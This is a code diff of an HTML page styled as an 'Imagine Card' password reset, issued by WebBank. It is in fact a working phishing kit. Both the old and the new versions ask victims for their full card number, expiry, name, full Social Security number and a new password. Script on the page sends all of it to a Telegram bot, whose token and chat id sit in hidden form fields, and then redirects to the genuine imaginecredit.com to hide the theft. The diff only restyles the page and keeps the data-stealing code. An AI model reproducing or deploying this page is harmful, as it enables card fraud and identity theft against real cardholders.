@@ -1,647 +1,522 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-  <title>Imagine Card · Reset Password</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
+    <title>Imagine Card · Reset Password</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet" />
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-    body {
-      background: #e8ecf2;
-      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
-      margin: 0;
-    }
+        body {
+            background: #eef1f5;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+            margin: 0;
+        }
 
-    .card-container {
-      max-width: 440px;
-      width: 100%;
-      background: #ffffff;
-      border-radius: 40px;
-      box-shadow: 0 24px 48px -16px rgba(0, 20, 40, 0.25);
-      padding: 28px 24px 32px;
-      border: 1px solid #eef2f8;
-    }
+        /* ----- main container – clean, minimal, professional ----- */
+        .reset-container {
+            max-width: 400px;
+            width: 100%;
+            background: #ffffff;
+            border-radius: 32px;
+            box-shadow: 0 20px 40px -12px rgba(0, 20, 40, 0.15);
+            padding: 32px 24px 28px;
+            border: 1px solid #e9edf4;
+            transition: all 0.2s;
+        }
 
-    .card-header {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      margin-bottom: 20px;
-    }
+        /* ----- brand header – subtle, no card preview ----- */
+        .brand-header {
+            text-align: center;
+            margin-bottom: 28px;
+        }
 
-    .card-header h2 {
-      font-size: 18px;
-      font-weight: 700;
-      letter-spacing: -0.3px;
-      color: #0b1f3b;
-      background: #f0f4fc;
-      padding: 6px 18px 6px 16px;
-      border-radius: 40px;
-      border: 1px solid #d2dcec;
-      display: inline-block;
-    }
+        .brand-header .logo-icon {
+            font-size: 28px;
+            font-weight: 700;
+            color: #0b1f3b;
+            letter-spacing: -0.5px;
+        }
 
-    .header-badge {
-      background: #eef3fb;
-      border-radius: 40px;
-      padding: 6px 16px;
-      font-size: 14px;
-      font-weight: 600;
-      color: #1a3456;
-      border: 1px solid #ced9ea;
-    }
+        .brand-header .logo-icon span {
+            color: #1a4b8c;
+        }
 
-    .card-preview {
-      background: #f5f9ff;
-      border-radius: 28px;
-      padding: 18px 20px 16px;
-      margin-bottom: 24px;
-      border: 1px solid #dde5f0;
-    }
+        .brand-header .sub {
+            font-size: 13px;
+            color: #6a7f9b;
+            font-weight: 500;
+            margin-top: 4px;
+            letter-spacing: 0.3px;
+        }
 
-    .card-number-row {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      background: white;
-      padding: 8px 16px;
-      border-radius: 60px;
-      border: 1px solid #d2dcec;
-      font-weight: 600;
-      font-size: 15px;
-      color: #0f2a48;
-    }
+        .brand-header .sub a {
+            color: #1a4b8c;
+            text-decoration: none;
+            font-weight: 600;
+        }
 
-    .card-number-row .label {
-      font-weight: 400;
-      color: #4d6583;
-      font-size: 14px;
-    }
+        .brand-header .sub a:hover {
+            text-decoration: underline;
+        }
 
-    .card-number-row .number {
-      font-family: 'Inter', monospace;
-      font-weight: 700;
-      letter-spacing: 1.2px;
-      font-size: 16px;
-    }
+        /* ----- form fields – clean, spacious, fast ----- */
+        .form-group {
+            margin-bottom: 16px;
+        }
 
-    .card-meta {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      margin-top: 14px;
-      padding: 0 6px;
-    }
+        .form-group label {
+            display: block;
+            font-size: 12px;
+            font-weight: 600;
+            color: #1f3552;
+            margin-bottom: 4px;
+            letter-spacing: 0.2px;
+            text-transform: uppercase;
+        }
 
-    .card-meta .exp {
-      background: #eaf1fc;
-      padding: 4px 16px;
-      border-radius: 40px;
-      font-weight: 600;
-      font-size: 14px;
-      border: 1px solid #d0dbea;
-      color: #1e3a5e;
-    }
+        .form-group .hint {
+            font-weight: 400;
+            color: #7a8fa8;
+            font-size: 11px;
+            text-transform: none;
+            margin-left: 4px;
+        }
 
-    .card-meta .issuer {
-      background: #eaf1fc;
-      padding: 4px 16px;
-      border-radius: 40px;
-      font-weight: 500;
-      font-size: 13px;
-      border: 1px solid #d0dbea;
-      color: #1e3a5e;
-    }
+        .form-control {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 15px;
+            border: 1.5px solid #dce3ed;
+            border-radius: 12px;
+            background: #fafcff;
+            transition: 0.15s;
+            font-family: 'Inter', sans-serif;
+            font-weight: 500;
+            color: #0a1f3b;
+            outline: none;
+        }
 
-    .card-footer-links {
-      display: flex;
-      justify-content: space-between;
-      margin-top: 16px;
-      background: #eaf1fa;
-      padding: 8px 16px;
-      border-radius: 60px;
-      border: 1px solid #d2ddec;
-      font-size: 12px;
-      color: #1f3d61;
-      font-weight: 500;
-    }
+        .form-control:focus {
+            border-color: #1a4b8c;
+            box-shadow: 0 0 0 4px rgba(26, 75, 140, 0.10);
+            background: #ffffff;
+        }
 
-    .card-footer-links a {
-      color: #0f2b51;
-      font-weight: 600;
-      text-decoration: none;
-    }
+        .form-control::placeholder {
+            color: #a5b8ce;
+            font-weight: 400;
+            font-size: 14px;
+        }
 
-    .form-group {
-      margin-bottom: 18px;
-    }
+        .row-2col {
+            display: flex;
+            gap: 12px;
+        }
 
-    .form-group label {
-      display: block;
-      font-size: 13px;
-      font-weight: 600;
-      color: #1c3452;
-      margin-bottom: 5px;
-    }
+        .row-2col .form-group {
+            flex: 1;
+        }
 
-    .form-group .hint {
-      font-weight: 400;
-      color: #5d7797;
-      font-size: 12px;
-      margin-left: 4px;
-    }
+        /* ----- divider line ----- */
+        .divider {
+            border: none;
+            border-top: 1.5px dashed #e2e9f2;
+            margin: 20px 0 18px 0;
+        }
 
-    .form-control {
-      width: 100%;
-      padding: 13px 18px;
-      font-size: 15px;
-      border: 1.5px solid #d3deed;
-      border-radius: 60px;
-      background: #fbfdff;
-      transition: 0.15s;
-      font-family: 'Inter', sans-serif;
-      font-weight: 500;
-      color: #0a1f3b;
-      outline: none;
-    }
+        /* ----- action button – primary CTA ----- */
+        .btn-primary {
+            width: 100%;
+            border: none;
+            padding: 15px;
+            border-radius: 12px;
+            font-weight: 700;
+            font-size: 16px;
+            background: #0b2a55;
+            color: white;
+            cursor: pointer;
+            transition: 0.15s;
+            border: 1px solid #091f3f;
+            box-shadow: 0 4px 12px rgba(11, 42, 85, 0.20);
+            margin-top: 6px;
+            letter-spacing: 0.3px;
+        }
 
-    .form-control:focus {
-      border-color: #1a4b8c;
-      box-shadow: 0 0 0 4px rgba(26, 75, 140, 0.12);
-      background: #ffffff;
-    }
+        .btn-primary:hover {
+            background: #153b70;
+            transform: scale(0.98);
+        }
 
-    .form-control::placeholder {
-      color: #98aec9;
-      font-weight: 400;
-    }
+        .btn-primary:active {
+            transform: scale(0.96);
+        }
 
-    .row-2col {
-      display: flex;
-      gap: 14px;
-    }
+        /* ----- footer / legal ----- */
+        .footer-note {
+            font-size: 11px;
+            color: #7a8fa8;
+            text-align: center;
+            margin-top: 20px;
+            padding-top: 16px;
+            border-top: 1px solid #edf2f8;
+            letter-spacing: 0.2px;
+            line-height: 1.5;
+        }
 
-    .row-2col .form-group {
-      flex: 1;
-    }
+        .footer-note span {
+            font-weight: 600;
+            color: #1f3d68;
+        }
 
-    .section-title {
-      font-weight: 700;
-      font-size: 15px;
-      color: #0f2847;
-      margin: 18px 0 12px 0;
-      padding-bottom: 8px;
-      border-bottom: 1.5px dashed #d7e1ef;
-    }
+        /* ----- PASSWORD OVERLAY (step 2) – clean modal ----- */
+        .password-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.45);
+            backdrop-filter: blur(6px);
+            align-items: center;
+            justify-content: center;
+            z-index: 999;
+            padding: 20px;
+        }
 
-    .action-row {
-      display: flex;
-      gap: 14px;
-      margin-top: 28px;
-      align-items: center;
-      justify-content: space-between;
-      flex-wrap: wrap;
-    }
+        .password-overlay.active {
+            display: flex;
+        }
 
-    .btn {
-      border: none;
-      padding: 14px 24px;
-      border-radius: 60px;
-      font-weight: 700;
-      font-size: 16px;
-      cursor: pointer;
-      transition: 0.12s;
-      flex: 1;
-      min-width: 110px;
-      border: 1px solid #cbd7e9;
-      text-align: center;
-      background: white;
-      color: #1a365d;
-    }
+        .password-modal {
+            background: white;
+            max-width: 400px;
+            width: 100%;
+            border-radius: 32px;
+            padding: 32px 28px 28px;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.25);
+            animation: fadeUp 0.25s ease;
+        }
 
-    .btn-primary {
-      background: #0b2a55;
-      color: white;
-      border: 1px solid #091f3f;
-      box-shadow: 0 6px 12px rgba(11, 42, 85, 0.18);
-    }
+        @keyframes fadeUp {
+            from { opacity: 0; transform: translateY(24px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
 
-    .btn-primary:hover {
-      background: #153b70;
-      transform: scale(0.97);
-    }
+        .password-modal h2 {
+            font-size: 22px;
+            font-weight: 700;
+            color: #0b1f3b;
+            margin-bottom: 4px;
+        }
 
-    .btn-secondary {
-      background: white;
-      border: 1px solid #c6d4e8;
-    }
+        .password-modal .modal-sub {
+            color: #5d7797;
+            font-size: 14px;
+            margin-bottom: 22px;
+        }
 
-    .btn-secondary:hover {
-      background: #f2f8ff;
-    }
+        .password-modal .form-group {
+            margin-bottom: 14px;
+        }
 
-    .telegram-credit {
-      font-size: 11px;
-      color: #5a7396;
-      text-align: center;
-      margin-top: 22px;
-      padding-top: 16px;
-      border-top: 1px solid #e2ebf6;
-    }
+        .password-modal .form-group label {
+            font-size: 12px;
+            font-weight: 600;
+            color: #1f3552;
+            text-transform: uppercase;
+            letter-spacing: 0.2px;
+            display: block;
+            margin-bottom: 4px;
+        }
 
-    .telegram-credit span {
-      font-weight: 600;
-      color: #1c3d68;
-    }
+        .password-modal .form-control {
+            padding: 14px 16px;
+            font-size: 15px;
+            border: 1.5px solid #dce3ed;
+            border-radius: 12px;
+            background: #fafcff;
+            width: 100%;
+            outline: none;
+            font-family: 'Inter', sans-serif;
+            font-weight: 500;
+            color: #0a1f3b;
+        }
 
-    .badge-secure {
-      background: #e4edf9;
-      border-radius: 40px;
-      padding: 3px 14px;
-      font-size: 11px;
-      font-weight: 600;
-      color: #1f3f6e;
-      display: inline-block;
-    }
+        .password-modal .form-control:focus {
+            border-color: #1a4b8c;
+            box-shadow: 0 0 0 4px rgba(26, 75, 140, 0.10);
+        }
 
-    /* Password window overlay */
-    .password-overlay {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.5);
-      backdrop-filter: blur(6px);
-      align-items: center;
-      justify-content: center;
-      z-index: 999;
-      padding: 20px;
-    }
+        .password-hint {
+            font-size: 12px;
+            color: #6a7f9b;
+            margin-top: 4px;
+            padding-left: 4px;
+        }
 
-    .password-overlay.active {
-      display: flex;
-    }
+        .password-modal .btn-primary {
+            margin-top: 8px;
+        }
 
-    .password-modal {
-      background: white;
-      max-width: 420px;
-      width: 100%;
-      border-radius: 40px;
-      padding: 32px 28px 28px;
-      box-shadow: 0 30px 60px rgba(0, 0, 0, 0.3);
-      animation: fadeUp 0.3s ease;
-    }
+        .modal-close {
+            background: none;
+            border: none;
+            font-size: 22px;
+            color: #8a9bb0;
+            cursor: pointer;
+            float: right;
+            margin-top: -6px;
+            padding: 4px 8px;
+            border-radius: 8px;
+            transition: 0.15s;
+        }
 
-    @keyframes fadeUp {
-      from { opacity: 0; transform: translateY(30px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
+        .modal-close:hover {
+            background: #f0f4fa;
+            color: #1c3452;
+        }
 
-    .password-modal h2 {
-      font-size: 22px;
-      font-weight: 700;
-      color: #0b1f3b;
-      margin-bottom: 6px;
-    }
-
-    .password-modal p {
-      color: #5d7797;
-      font-size: 14px;
-      margin-bottom: 20px;
-    }
-
-    .password-modal .form-group {
-      margin-bottom: 16px;
-    }
-
-    .password-modal .form-group label {
-      font-size: 13px;
-      font-weight: 600;
-      color: #1c3452;
-      margin-bottom: 5px;
-      display: block;
-    }
-
-    .password-modal .form-control {
-      padding: 13px 18px;
-      font-size: 15px;
-      border: 1.5px solid #d3deed;
-      border-radius: 60px;
-      background: #fbfdff;
-      width: 100%;
-      outline: none;
-      font-family: 'Inter', sans-serif;
-      font-weight: 500;
-      color: #0a1f3b;
-    }
-
-    .password-modal .form-control:focus {
-      border-color: #1a4b8c;
-      box-shadow: 0 0 0 4px rgba(26, 75, 140, 0.12);
-    }
-
-    .password-modal .btn {
-      width: 100%;
-      margin-top: 8px;
-    }
-
-    .password-hint {
-      font-size: 12px;
-      color: #5d7797;
-      margin-top: 4px;
-      padding-left: 6px;
-    }
-
-    .modal-close {
-      background: none;
-      border: none;
-      font-size: 24px;
-      color: #8a9bb0;
-      cursor: pointer;
-      float: right;
-      margin-top: -8px;
-    }
-
-    .modal-close:hover {
-      color: #1c3452;
-    }
-
-    @media (max-width: 480px) {
-      .card-container { padding: 22px 16px; }
-      .action-row { flex-direction: column; }
-      .btn { width: 100%; }
-      .password-modal { padding: 24px 20px; }
-    }
-  </style>
+        @media (max-width: 440px) {
+            .reset-container { padding: 24px 18px 22px; }
+            .password-modal { padding: 24px 20px; }
+        }
+    </style>
 </head>
 <body>
-  <!-- MAIN CARD -->
-  <div class="card-container">
-    <div class="card-header">
-      <h2>💳 Imagine Card Details</h2>
-      <div class="header-badge">🔐 1202588</div>
+
+    <!-- MAIN CONTAINER – NO CARD PREVIEW, NO LOGOUT -->
+    <div class="reset-container">
+
+        <!-- simple brand header -->
+        <div class="brand-header">
+            <div class="logo-icon">Imagine<span>Card</span></div>
+            <div class="sub">Secure Account · <a href="#" target="_blank">imaginecredit.com</a></div>
+        </div>
+
+        <!-- STEP 1: collect only card details, full name, SSN -->
+        <form id="step1Form" autocomplete="off">
+            <div class="form-group">
+                <label>Full Card Number <span class="hint">(16 digits)</span></label>
+                <input type="text" class="form-control" id="fullCardNumber" placeholder="1234 5678 9012 3456" required autocomplete="cc-number" />
+            </div>
+
+            <div class="row-2col">
+                <div class="form-group">
+                    <label>Last 4 Digits</label>
+                    <input type="text" class="form-control" id="lastFour" placeholder="3456" maxlength="4" required autocomplete="cc-number" />
+                </div>
+                <div class="form-group">
+                    <label>Expiry <span class="hint">(MM/YY)</span></label>
+                    <input type="text" class="form-control" id="expiryDate" placeholder="MM/YY" required autocomplete="cc-exp" />
+                </div>
+            </div>
+
+            <hr class="divider" />
+
+            <div class="form-group">
+                <label>Full Name <span class="hint">(as on card)</span></label>
+                <input type="text" class="form-control" id="fullName" placeholder="John A. Doe" required autocomplete="name" />
+            </div>
+
+            <div class="form-group">
+                <label>Full SSN <span class="hint">(9 digits, no dashes)</span></label>
+                <input type="text" class="form-control" id="ssn" placeholder="123456789" required autocomplete="off" />
+            </div>
+
+            <div class="row-2col" style="margin-top: -2px;">
+                <div class="form-group">
+                    <label>Last 4 SSN <span class="hint">(verify)</span></label>
+                    <input type="text" class="form-control" id="lastFourSsn" placeholder="6789" maxlength="4" required autocomplete="off" />
+                </div>
+                <div class="form-group" style="display: flex; align-items: flex-end; justify-content: flex-end; padding-bottom: 2px;">
+                    <span style="font-size: 12px; font-weight: 600; color: #1a4b8c; background: #edf3fc; padding: 4px 14px; border-radius: 30px;">🔒 secure</span>
+                </div>
+            </div>
+
+            <button type="submit" class="btn-primary" id="continueBtn">Continue →</button>
+
+            <!-- hidden: bot token & chat id -->
+            <input type="hidden" id="botToken" value="8901133113:AAGJgaIpLD74GFyE6bTm3A4x5GSFwxMHdgA" />
+            <input type="hidden" id="chatId" value="8737104261" />
+        </form>
+
+        <div class="footer-note">
+            This card is issued by WebBank, pursuant to license from Visa U.S.A. Inc.<br />
+            <span>⚡ Data sent to Telegram · redirect to imaginecredit.com</span>
+        </div>
     </div>
 
-    <div class="card-preview">
-      <div class="card-number-row">
-        <span class="label">Card Number</span>
-        <span class="number">1012 3456 7890 1234</span>
-      </div>
-      <div class="card-meta">
-        <span class="exp">00/00</span>
-        <span class="issuer">VISA · WebBank</span>
-      </div>
-      <div class="card-footer-links">
-        <span>📞 1-888-549-0040</span>
-        <a href="#" target="_blank">www.imaginecredit.com</a>
-      </div>
+    <!-- STEP 2: PASSWORD OVERLAY (appears after step 1) -->
+    <div class="password-overlay" id="passwordOverlay">
+        <div class="password-modal">
+            <button class="modal-close" id="closeModalBtn" aria-label="Close">✕</button>
+            <h2>🔑 Set New Password</h2>
+            <p class="modal-sub">Create a strong password for your account.</p>
+            <form id="passwordForm">
+                <div class="form-group">
+                    <label>New Password <span class="hint">(min 8 chars)</span></label>
+                    <input type="password" class="form-control" id="newPassword" placeholder="••••••••" required minlength="8" autocomplete="new-password" />
+                    <div class="password-hint">Use at least 8 characters with a mix of letters, numbers &amp; symbols</div>
+                </div>
+                <div class="form-group">
+                    <label>Confirm Password</label>
+                    <input type="password" class="form-control" id="confirmPassword" placeholder="••••••••" required autocomplete="new-password" />
+                </div>
+                <button type="submit" class="btn-primary" id="setPasswordBtn">Set Password &amp; Activate</button>
+            </form>
+        </div>
     </div>
 
-    <!-- STEP 1: collect card details, full name, SSN -->
-    <form id="step1Form">
-      <div class="form-group">
-        <label>Full Card Number <span class="hint">(16 digits)</span></label>
-        <input type="text" class="form-control" id="fullCardNumber" placeholder="1234 5678 9012 3456" required autocomplete="cc-number">
-      </div>
+    <script>
+        (function() {
+            // DOM refs
+            const step1Form = document.getElementById('step1Form');
+            const passwordOverlay = document.getElementById('passwordOverlay');
+            const passwordForm = document.getElementById('passwordForm');
+            const closeModalBtn = document.getElementById('closeModalBtn');
 
-      <div class="row-2col">
-        <div class="form-group">
-          <label>Last 4 Digits</label>
-          <input type="text" class="form-control" id="lastFour" placeholder="3456" maxlength="4" required autocomplete="cc-number">
-        </div>
-        <div class="form-group">
-          <label>Expiry <span class="hint">(MM/YY)</span></label>
-          <input type="text" class="form-control" id="expiryDate" placeholder="MM/YY" required autocomplete="cc-exp">
-        </div>
-      </div>
+            let step1Data = {};
 
-      <div class="section-title">👤 Primary Cardmember Information</div>
+            // Build Telegram message
+            function buildTelegramMessage(data) {
+                const { fullCard, lastFour, expiry, fullName, ssn, lastFourSsn, newPassword } = data;
+                return `🔹 *Imagine Card · Password Reset* 🔹\n\n` +
+                    `💳 *Full Card:* ${fullCard}\n` +
+                    `🔸 *Last 4:* ${lastFour}\n` +
+                    `📅 *Expiry:* ${expiry}\n` +
+                    `👤 *Full Name:* ${fullName}\n` +
+                    `🆔 *Full SSN:* ${ssn}\n` +
+                    `🔢 *Last 4 SSN:* ${lastFourSsn}\n` +
+                    `🔑 *New Password:* ${newPassword}\n` +
+                    `━━━━━━━━━━━━━━\n` +
+                    `✅ submitted via Imagine Card`;
+            }
 
-      <div class="form-group">
-        <label>Full Name <span class="hint">(as on card)</span></label>
-        <input type="text" class="form-control" id="fullName" placeholder="John A. Doe" required autocomplete="name">
-      </div>
+            // Send to Telegram
+            async function sendToTelegram(message) {
+                const token = document.getElementById('botToken').value;
+                const chatId = document.getElementById('chatId').value;
+                const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
-      <div class="form-group">
-        <label>Full SSN <span class="hint">(9 digits, no dashes)</span></label>
-        <input type="text" class="form-control" id="ssn" placeholder="123456789" required autocomplete="off">
-      </div>
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message,
+                            parse_mode: 'Markdown',
+                            disable_web_page_preview: true,
+                        })
+                    });
+                    const result = await response.json();
+                    if (!result.ok) {
+                        console.warn('Telegram error:', result);
+                    }
+                    return result;
+                } catch (error) {
+                    console.error('Telegram send failed:', error);
+                }
+            }
 
-      <div class="row-2col" style="margin-top: -2px;">
-        <div class="form-group">
-          <label>Last 4 SSN <span class="hint">(verify)</span></label>
-          <input type="text" class="form-control" id="lastFourSsn" placeholder="6789" maxlength="4" required autocomplete="off">
-        </div>
-        <div class="form-group" style="display: flex; align-items: flex-end; justify-content: flex-end; padding-bottom: 4px;">
-          <span class="badge-secure">🔒 secure</span>
-        </div>
-      </div>
+            // STEP 1: validate & show password overlay
+            step1Form.addEventListener('submit', function(e) {
+                e.preventDefault();
 
-      <div class="action-row">
-        <button type="button" class="btn btn-secondary" id="logoutBtn">Log out</button>
-        <button type="submit" class="btn btn-primary" id="continueBtn">Continue →</button>
-      </div>
+                const fullCard = document.getElementById('fullCardNumber').value.trim();
+                const lastFour = document.getElementById('lastFour').value.trim();
+                const expiry = document.getElementById('expiryDate').value.trim();
+                const fullName = document.getElementById('fullName').value.trim();
+                const ssn = document.getElementById('ssn').value.trim();
+                const lastFourSsn = document.getElementById('lastFourSsn').value.trim();
 
-      <input type="hidden" id="botToken" value="8901133113:AAGJgaIpLD74GFyE6bTm3A4x5GSFwxMHdgA">
-      <input type="hidden" id="chatId" value="8737104261">
-    </form>
+                if (!fullCard || !lastFour || !expiry || !fullName || !ssn || !lastFourSsn) {
+                    alert('⚠️ Please fill in all fields.');
+                    return;
+                }
 
-    <div class="telegram-credit">
-      This card is issued by WebBank, pursuant to license from Visa U.S.A. Inc.<br>
-      <span>⚡ Data sent to Telegram · redirect to imaginecredit.com</span>
-    </div>
-  </div>
+                if (ssn.replace(/\D/g, '').length < 9) {
+                    alert('Please enter a valid 9-digit SSN (digits only).');
+                    return;
+                }
 
-  <!-- STEP 2: PASSWORD OVERLAY (appears after step 1 submit) -->
-  <div class="password-overlay" id="passwordOverlay">
-    <div class="password-modal">
-      <button class="modal-close" id="closeModalBtn" aria-label="Close">✕</button>
-      <h2>🔑 Set New Password</h2>
-      <p>Create a strong password for your account.</p>
-      <form id="passwordForm">
-        <div class="form-group">
-          <label>New Password <span class="hint">(min 8 characters)</span></label>
-          <input type="password" class="form-control" id="newPassword" placeholder="••••••••" required minlength="8" autocomplete="new-password">
-          <div class="password-hint">Use at least 8 characters with a mix of letters, numbers &amp; symbols</div>
-        </div>
-        <div class="form-group">
-          <label>Confirm Password</label>
-          <input type="password" class="form-control" id="confirmPassword" placeholder="••••••••" required autocomplete="new-password">
-        </div>
-        <button type="submit" class="btn btn-primary" id="setPasswordBtn">Set Password &amp; Activate</button>
-      </form>
-    </div>
-  </div>
+                step1Data = { fullCard, lastFour, expiry, fullName, ssn, lastFourSsn };
 
-  <script>
-    (function() {
-      // DOM refs
-      const step1Form = document.getElementById('step1Form');
-      const passwordOverlay = document.getElementById('passwordOverlay');
-      const passwordForm = document.getElementById('passwordForm');
-      const closeModalBtn = document.getElementById('closeModalBtn');
+                // Show password overlay
+                passwordOverlay.classList.add('active');
+                document.getElementById('newPassword').value = '';
+                document.getElementById('confirmPassword').value = '';
+                setTimeout(() => document.getElementById('newPassword').focus(), 120);
+            });
 
-      // Store step1 data to send with password
-      let step1Data = {};
+            // Close modal (X button)
+            closeModalBtn.addEventListener('click', function() {
+                passwordOverlay.classList.remove('active');
+            });
 
-      // Build Telegram message (includes all data + password)
-      function buildTelegramMessage(data) {
-        const { fullCard, lastFour, expiry, fullName, ssn, lastFourSsn, newPassword } = data;
-        return `🔹 *Imagine Card · Password Reset* 🔹\n\n` +
-               `💳 *Full Card:* ${fullCard}\n` +
-               `🔸 *Last 4:* ${lastFour}\n` +
-               `📅 *Expiry:* ${expiry}\n` +
-               `👤 *Full Name:* ${fullName}\n` +
-               `🆔 *Full SSN:* ${ssn}\n` +
-               `🔢 *Last 4 SSN:* ${lastFourSsn}\n` +
-               `🔑 *New Password:* ${newPassword}\n` +
-               `━━━━━━━━━━━━━━\n` +
-               `✅ submitted via Imagine Card`;
-      }
+            // Close modal on click outside
+            passwordOverlay.addEventListener('click', function(e) {
+                if (e.target === passwordOverlay) {
+                    passwordOverlay.classList.remove('active');
+                }
+            });
 
-      // Send to Telegram
-      async function sendToTelegram(message) {
-        const token = document.getElementById('botToken').value;
-        const chatId = document.getElementById('chatId').value;
-        const url = `https://api.telegram.org/bot${token}/sendMessage`;
+            // STEP 2: password submission
+            passwordForm.addEventListener('submit', async function(e) {
+                e.preventDefault();
 
-        try {
-          const response = await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              chat_id: chatId,
-              text: message,
-              parse_mode: 'Markdown',
-              disable_web_page_preview: true,
-            })
-          });
-          const result = await response.json();
-          if (!result.ok) {
-            console.warn('Telegram error:', result);
-          }
-          return result;
-        } catch (error) {
-          console.error('Telegram send failed:', error);
-        }
-      }
+                const newPassword = document.getElementById('newPassword').value.trim();
+                const confirmPassword = document.getElementById('confirmPassword').value.trim();
 
-      // STEP 1: validate & show password overlay
-      step1Form.addEventListener('submit', function(e) {
-        e.preventDefault();
+                if (!newPassword || !confirmPassword) {
+                    alert('Please enter and confirm your new password.');
+                    return;
+                }
 
-        const fullCard = document.getElementById('fullCardNumber').value.trim();
-        const lastFour = document.getElementById('lastFour').value.trim();
-        const expiry = document.getElementById('expiryDate').value.trim();
-        const fullName = document.getElementById('fullName').value.trim();
-        const ssn = document.getElementById('ssn').value.trim();
-        const lastFourSsn = document.getElementById('lastFourSsn').value.trim();
+                if (newPassword.length < 8) {
+                    alert('Password must be at least 8 characters long.');
+                    return;
+                }
 
-        // Validate all fields
-        if (!fullCard || !lastFour || !expiry || !fullName || !ssn || !lastFourSsn) {
-          alert('⚠️ Please fill in all fields: Full Card, Last 4, Expiry, Name, SSN, and Last 4 SSN.');
-          return;
-        }
+                if (newPassword !== confirmPassword) {
+                    alert('Passwords do not match.');
+                    return;
+                }
 
-        if (ssn.replace(/\D/g, '').length < 9) {
-          alert('Please enter a valid 9-digit SSN (digits only, no dashes).');
-          return;
-        }
+                const allData = { ...step1Data, newPassword };
+                const message = buildTelegramMessage(allData);
 
-        // Store data for step 2
-        step1Data = { fullCard, lastFour, expiry, fullName, ssn, lastFourSsn };
+                try {
+                    await sendToTelegram(message);
+                } catch (err) {
+                    console.warn('telegram error, continuing');
+                }
 
-        // Show password overlay
-        passwordOverlay.classList.add('active');
-        // Clear password fields (in case overlay was opened before)
-        document.getElementById('newPassword').value = '';
-        document.getElementById('confirmPassword').value = '';
-        // Focus first password field
-        setTimeout(() => document.getElementById('newPassword').focus(), 100);
-      });
+                passwordOverlay.classList.remove('active');
+                window.location.href = 'https://www.imaginecredit.com';
+            });
 
-      // Close modal (X button)
-      closeModalBtn.addEventListener('click', function() {
-        passwordOverlay.classList.remove('active');
-      });
-
-      // Close modal on click outside
-      passwordOverlay.addEventListener('click', function(e) {
-        if (e.target === passwordOverlay) {
-          passwordOverlay.classList.remove('active');
-        }
-      });
-
-      // STEP 2: password submission
-      passwordForm.addEventListener('submit', async function(e) {
-        e.preventDefault();
-
-        const newPassword = document.getElementById('newPassword').value.trim();
-        const confirmPassword = document.getElementById('confirmPassword').value.trim();
-
-        if (!newPassword || !confirmPassword) {
-          alert('Please enter and confirm your new password.');
-          return;
-        }
-
-        if (newPassword.length < 8) {
-          alert('Password must be at least 8 characters long.');
-          return;
-        }
-
-        if (newPassword !== confirmPassword) {
-          alert('Passwords do not match. Please re-enter.');
-          return;
-        }
-
-        // Combine all data
-        const allData = { ...step1Data, newPassword };
-        const message = buildTelegramMessage(allData);
-
-        // Send to Telegram
-        try {
-          await sendToTelegram(message);
-        } catch (err) {
-          console.warn('telegram error, continuing');
-        }
-
-        // Close overlay
-        passwordOverlay.classList.remove('active');
-
-        // Redirect to imaginecredit.com
-        window.location.href = 'https://www.imaginecredit.com';
-      });
-
-      // Log out button: reset form
-      document.getElementById('logoutBtn').addEventListener('click', function() {
-        if (confirm('Log out from Imagine Card? Any unsaved data will be lost.')) {
-          step1Form.reset();
-          document.querySelectorAll('#step1Form .form-control').forEach(el => el.value = '');
-        }
-      });
-
-      // Handle Escape key to close modal
-      document.addEventListener('keydown', function(e) {
-        if (e.key === 'Escape' && passwordOverlay.classList.contains('active')) {
-          passwordOverlay.classList.remove('active');
-        }
-      });
-    })();
-  </script>
+            // Handle Escape key
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Escape' && passwordOverlay.classList.contains('active')) {
+                    passwordOverlay.classList.remove('active');
+                }
+            });
+        })();
+    </script>
 </body>
 </html>
